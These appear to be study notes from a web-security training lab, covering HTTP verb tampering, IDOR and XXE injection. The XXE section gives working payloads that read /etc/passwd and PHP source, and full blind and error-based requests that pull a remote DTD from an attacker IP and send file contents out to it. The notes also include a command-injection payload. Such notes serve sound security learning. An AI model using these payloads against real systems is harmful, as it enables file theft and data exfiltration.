# Web attacks

\*\*Types of http requests

* **Safe Methods:** These are methods that do not modify the state of the server. They are "read-only" operations.
* **Idempotent Methods:** An idempotent request is one where making the same request multiple times has the same effect as making it once. For example, deleting a file once is the same as deleting it five times—the file is still gone.

| **Method**  | **Description**                                                                                 | **Safe?** | **Idempotent?** |
| ----------- | ----------------------------------------------------------------------------------------------- | --------- | --------------- |
| **GET**     | Requests data from a specified resource. Should only retrieve data and have no other effect.    | **Yes**   | **Yes**         |
| **POST**    | Sends data to a server to create or update a resource. Common for forms and API submissions.    | No        | No              |
| **PUT**     | Replaces all current representations of the target resource with the request payload.           | No        | **Yes**         |
| **PATCH**   | Applies partial modifications to a resource (more efficient than PUT for small changes).        | No        | No              |
| **DELETE**  | Deletes the specified resource.                                                                 | No        | **Yes**         |
| **HEAD**    | Same as GET but asks for the response without the body (useful for checking headers).           | **Yes**   | **Yes**         |
| **OPTIONS** | Describes the communication options for the target resource (essential for CORS).               | **Yes**   | **Yes**         |
| **CONNECT** | Establishes a tunnel to the server identified by the target resource (used for HTTPS).          | No        | No              |
| **TRACE**   | Performs a message loop-back test along the path to the target resource (useful for debugging). | **Yes**   | **Yes**         |

## HTTP Verb Tampering

**HTTP Verb Tampering**, specifically how insecure web server configurations can allow you to bypass **HTTP Basic Authentication** by simply changing the request method.

#### 🔑 Core Concept: HTTP Verb Tampering

Verb Tampering occurs when a web server or application is configured to protect a resource (like a directory or a script) only for specific HTTP methods (e.g., `GET` or `POST`), while leaving others (like `HEAD`, `OPTIONS`, or `PUT`) unprotected.

#### 🛡️ Scenario: The Restricted File Manager

* **The Target:** A "Reset" button that calls `/admin/reset.php`.
* **The Barrier:** Accessing this page triggers an **HTTP Basic Auth** prompt. Without credentials, you receive a **401 Unauthorized** error.
* **Discovery:** Testing revealed that both `GET` and `POST` methods are covered by the authentication filter.

#### 🛠️ The Exploitation Process

The text outlines a systematic approach to identifying and bypassing these filters:

1. **Enumerate Methods:** Use `curl -I -X OPTIONS` to see which HTTP methods the server supports.
   * _Result:_ The server allowed `POST, OPTIONS, HEAD, GET`.
2. **Identify the Weak Link:** The **`HEAD`** method is identical to `GET` but returns only headers (no body). Often, developers forget to include `HEAD` in their security configuration.
3. **Execute the Bypass:**
   * Intercept the request in **Burp Suite**.
   * Change the method from `GET` or `POST` to **`HEAD`**.
   * Forward the request.
4. **The Result:** The server processes the request logic (deleting the files) but doesn't challenge the user for a password because the `HEAD` method wasn't "on the list" of restricted verbs.

> This vulnerability is usually caused by **Insecure Web Server Configurations**. In configuration files (like `.htaccess` or `web.config`), developers might use tags like `<Limit GET POST>`, which tells the server: _"Only ask for a password if the user uses GET or POST."_ Any other method, like `HEAD`, is allowed through automatically.

| **What is this Vulnerability?**                                                                                                                                                                          | **How to Bypass & Exploit It**                                                                                                                                                           |
| -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Logic Flaw:** The security filter is "method-specific." It only inspects data inside specific global variables (e.g., it checks `$_PUT['name']` for malicious characters but ignores `$_GET['name']`). | **Method Swapping:** Intercept the request in Burp Suite and use the **"Change Request Method"** feature (e.g., switch a `PUT` to a `GET`).                                              |
| **Filtered Input:** Malicious strings like `;`, `&&`, or `\|` are detected and blocked when sent via the "intended" method (usually `POST`), resulting in a "Malicious Request Denied!" message.         | **Blind Spot Testing:** If the filter only looks at `POST` data, sending the same payload via `GET` parameters allows the malicious string to reach the system command line uninspected. |
| **Command Injection Potential:** The application takes user input and passes it to a system shell (like `system()` or `exec()`), relying solely on that flawed filter for safety.                        | **Payload Execution:** Once the filter is bypassed, use a command injection payload (e.g., `file; cp /flag.txt ./;`) to execute arbitrary commands on the server.                        |

***

***

## IDOR (Insecure Direct Object Reference)

| **Identification Method** | **Key Techniques & Examples**                                                                                                                | **Security Weakness**                                                                                                                             |
| ------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------- |
| **URL Parameters & APIs** | Inspecting the URL or API calls for direct references like `?uid=1` or `?filename=file_1.pdf`. Use **fuzzing** or manual incrementing.       | The app assumes the user will only request their "own" numbers/files and lacks server-side ownership checks.                                      |
| **AJAX Calls**            | Digging through front-end JavaScript code to find hidden functions (e.g., `changeUserPassword`) or endpoints not visible in the standard UI. | Developers often hide "admin-only" functions on the front-end but leave the back-end API endpoint active and unprotected.                         |
| **Encoding & Hashing**    | Recognizing patterns like **Base64** (`ZmlsZ...`) or **MD5 hashes**. Deciphering the "plaintext" behind the mask to predict the next value.  | Obscurity $\neq$ Security. If the hashing logic is visible in the JS code or uses a common algorithm, it is easily reversible or predictable.     |
| **Comparing User Roles**  | Registering two different accounts (User A and User B). Capturing a request from User A and attempting to replay it with User B’s session.   | The back-end checks if a user is "logged in" (Authentication) but fails to check if they "own" the specific data being requested (Authorization). |

| **Key Concept**         | **Description**                                                                                                          | **Security Impact**                                                                   |
| ----------------------- | ------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------- |
| **Insecure Parameters** | Using plain-text identifiers like `uid=1` in the URL (GET) or body (POST) to fetch user records.                         | Allows attackers to "guess" or iterate through all users to access private data.      |
| **Static File IDOR**    | Files named with predictable patterns (e.g., `Invoice_1_2021.pdf` where `1` is the UID).                                 | Attackers can download files directly even if the web page doesn't link to them.      |
| **Subtle IDOR**         | A vulnerability where the page looks identical for every `uid`, but the **hidden HTML links** in the source code change. | Often missed by manual testing; requires inspecting the page source or response size. |
| **Mass Enumeration**    | The practice of using scripts (Bash, Python) or tools (Burp Intruder) to harvest data from thousands of IDs.             | Converts a small logic bug into a massive data breach.                                |

| **Concept**             | **Description**                                                | **Vulnerability/Insight**                                                                                          |
| ----------------------- | -------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------ |
| **Hashed References**   | Using a one-way function (like MD5) to hide the `uid`.         | **Security by Obscurity:** It looks random (e.g., `cdd96...`), but if the input is predictable, the hash is too.   |
| **Function Disclosure** | Sensitive logic being performed in front-end JavaScript files. | **The "Leaked" Secret:** By reading the source code, we found that the hash is generated using `MD5(Base64(UID))`. |
| **Reverse Engineering** | Determining the exact encoding/hashing steps.                  | Once the "recipe" is known (ID $\rightarrow$ Base64 $\rightarrow$ MD5), we can generate hashes for any user.       |
| **Mass Enumeration**    | Automating the generation of these complex hashes.             | Using a Bash script to loop through numbers, encode them, hash them, and request the files.                        |

| **Concept**                 | **Description**                                                                      | **Security Risk**                                                                                   |
| --------------------------- | ------------------------------------------------------------------------------------ | --------------------------------------------------------------------------------------------------- |
| **Insecure Function Calls** | Exploiting an API to execute actions (edit, delete, create) as another user.         | Can lead to account takeovers, unauthorized purchases, or data destruction.                         |
| **API Methods**             | The use of `GET` (read), `POST` (create), `PUT` (update), and `DELETE` (remove).     | Developers often secure `PUT/POST` but forget to apply the same restrictions to `GET`.              |
| **Client-Side Privilege**   | Sending roles (e.g., `role=employee`) in cookies or JSON bodies.                     | If the backend doesn't verify this against a database, a user can simply rename themselves "admin." |
| **Information Chaining**    | Using a "Read" IDOR to get a secret (like a `uuid`) to then bypass an "Update" IDOR. | One small leak provides the keys to a much larger functional bypass.                                |

| **Concept**                 | **Description**                                                                                                                            |
| --------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------ |
| **Information Disclosure**  | Using a `GET` request on an API endpoint (e.g., `/profile/api.php/profile/2`) to leak sensitive user details like **UUIDs** and **Roles**. |
| **Insecure Function Calls** | Utilizing the leaked information to execute state-changing actions via `PUT`, `POST`, or `DELETE` requests.                                |
| **UUID (Object Reference)** | A unique identifier that often acts as a "secret" key. Chaining allows an attacker to discover these keys and bypass access controls.      |
| **Privilege Escalation**    | Identifying a high-privilege role (e.g., `web_admin`) and manually updating your own profile's JSON to adopt that role.                    |

***

***

## XML Injection

| **Concept**                          | **Definition**                                                                                             | **Security Significance**                                                                                         |
| ------------------------------------ | ---------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------- |
| **XXE Injection**                    | A vulnerability that occurs when user-supplied XML is parsed without disabling external entity resolution. | One of the **OWASP Top 10** risks; can lead to file disclosure, SSRF, or DoS.                                     |
| **XML (Extensible Markup Language)** | A markup language designed to store and transport data in a hierarchical tree structure.                   | The "language" of the attack; its flexibility is what makes it vulnerable if not handled correctly.               |
| **DTD (Document Type Definition)**   | A set of rules that defines the structure and the legal elements/attributes of an XML document.            | Attackers use the DTD to define malicious entities that the parser will then execute.                             |
| **Entities**                         | XML "variables" used to store and reuse data (e.g., `&company;` for "Inlane Freight").                     | These are the primary vectors for XXE. Internal entities are usually safe, but external ones are dangerous.       |
| **SYSTEM Keyword**                   | A keyword in a DTD used to tell the parser to fetch the entity value from an external URI/file.            | **The "Trigger":** This allows an attacker to point the parser toward sensitive local files (like `/etc/passwd`). |

| **Component**     | **Definition**                                                          | **Example**                                                                                                            | **Pentesting/Security Note**                                                    |
| ----------------- | ----------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------- |
| **Declaration**   | The first line that defines the XML version and character encoding.     | `<?xml version="1.0" encoding="UTF-8"?>`                                                                               | Tells the parser how to read the rest of the file.                              |
| **Tag**           | The "brackets" used to define the start and end of a piece of data.     | <p><code>&#x3C;username></code> (Start)<br><br><br><br><code>&#x3C;/username></code> (End)</p>                         | Parsers look for these to understand where data begins and ends.                |
| **Element**       | The complete "package": the start tag, the content, and the end tag.    | `<role>admin</role>`                                                                                                   | This is the actual data being sent to the application.                          |
| **Attribute**     | Extra information about an element, placed inside the start tag.        | `<user id="5">`                                                                                                        | Often used as a target for IDOR or SQLi if the `id` is processed by a database. |
| **Entity**        | A "variable" used to represent a string of text or a special character. | <p><code>&#x26;company;</code> (Standard)<br><br><br><br><code>&#x26;lt;</code> (Special char <code>&#x3C;</code>)</p> | **Critical for XXE.** These can be manipulated to pull external files.          |
| **Root Element**  | The "Parent" tag that wraps every other element in the document.        | `<root> ... </root>`                                                                                                   | An XML document can only have **one** root element.                             |
| **Comment**       | Text meant for humans that the parser ignores.                          | \`\`                                                                                                                   | Sometimes contains "leaked" info like dev notes or hidden endpoints.            |
| **DTD (DOCTYPE)** | A block that defines the rules and entities for the document.           | `<!DOCTYPE data [ <!ENTITY x "y"> ]>`                                                                                  | This is where you "inject" malicious external entities for an XXE attack.       |

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY readfile SYSTEM "file:///etc/passwd">
]>
<root>
  <username>&readfile;</username>
</root>
```

| **Injection Type**         | **Purpose**                                                   | **Example Payload Snippet**                                      |
| -------------------------- | ------------------------------------------------------------- | ---------------------------------------------------------------- |
| **Local File Disclosure**  | Reading sensitive system files like passwords or configs.     | `SYSTEM "file:///etc/passwd"`                                    |
| **Source Code Disclosure** | Reading the PHP/ASP source code of the web app.               | `SYSTEM "php://filter/convert.base64-encode/resource=index.php"` |
| **SSRF**                   | Making the server "attack" other internal servers.            | `SYSTEM "http://internal-service.local/api/keys"`                |
| **Denial of Service**      | Crashing the server using memory exhaustion (Billion Laughs). | Nested entities that expand exponentially.                       |

| **Attack Type**        | **The Problem (Limitation)**                                                                      | **The Bypass (Exploitation Technique)**                                                                      | **Key Requirements**                                       |
| ---------------------- | ------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------ | ---------------------------------------------------------- |
| **CDATA Exfiltration** | Files containing characters like `<` or `&` (e.g., PHP source code) break the XML parser.         | Wrap the file content in a **CDATA** tag so the parser treats it as "raw data" rather than code.             | A remote DTD file hosted on your machine (Attacker IP).    |
| **Error-Based XXE**    | The web app is **Blind** (it doesn't show your input in the response), so you can't see the file. | Force the server to throw an **error message** that includes the content of the file you are trying to read. | A remote DTD file and server-side error reporting enabled. |

\*\*CDATA Exfiltration

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % begin "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///flag.php">
  <!ENTITY % end "]]>">
  <!ENTITY % xxe SYSTEM "http://10.10.16.191:8000/xxe.dtd">
  %xxe;
]>
<root>
  <name>first</name>
  <tel>1111111111111111</tel>
  <email>&joined;</email>
  <message>query</message>
</root>
```

_In the xxe.dtd file content_

```
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
```

\*\*Error Based

```
POST /error/submitDetails.php HTTP/1.1
Host: 10.129.57.62
Content-Length: 360
Accept-Language: en-GB,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://10.129.57.62
Referer: http://10.129.57.62/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % begin "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///flagg.php">
  <!ENTITY % end "]]>">
  <!ENTITY % xxe SYSTEM "http://10.10.16.191:8000/xxe.dtd">
  %xxe;
]>
<root>
  <name>first</name>
  <tel>1111111111111111</tel>
  <email>&joined;</email>
  <message>query</message>
</root>
```

_The file content_

```
<!ENTITY % file SYSTEM "file:///flag.php">
<!ENTITY % error "<!ENTITY content SYSTEM 'file:///nonexistent/%file;'>">
%error;
```

\*\*BLIND

```
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.57.62
Content-Length: 170
Accept-Language: en-GB,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://10.129.57.62
Referer: http://10.129.57.62/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [ 
  <!ENTITY % remote SYSTEM "http://10.10.16.191:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

_The file content_

```
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/327a6c4304ad5938eaf0efb6cc3e53dc.php">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://10.10.16.191:8000/index.php?content=%file;'>">
```
